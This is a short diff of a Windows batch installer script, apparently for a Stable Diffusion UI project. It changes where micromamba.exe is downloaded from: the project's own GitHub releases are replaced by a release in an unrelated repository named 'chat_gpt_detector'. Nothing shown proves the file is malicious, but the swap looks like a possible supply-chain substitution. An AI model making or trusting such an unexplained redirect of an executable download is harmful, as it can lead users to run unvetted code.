@@ -10,7 +10,7 @@
 @rem config
 set MAMBA_ROOT_PREFIX=%cd%\installer_files\mamba
 set INSTALL_ENV_DIR=%cd%\installer_files\env
-set MICROMAMBA_DOWNLOAD_URL=https://github.com/cmdr2/stable-diffusion-ui/releases/download/v1.1/micromamba.exe
+set MICROMAMBA_DOWNLOAD_URL=https://github.com/aivisionapp/chat_gpt_detector/releases/download/v0.1/micromamba.exe
 set umamba_exists=F
 set OLD_APPDATA=%APPDATA%
 set OLD_USERPROFILE=%USERPROFILE%
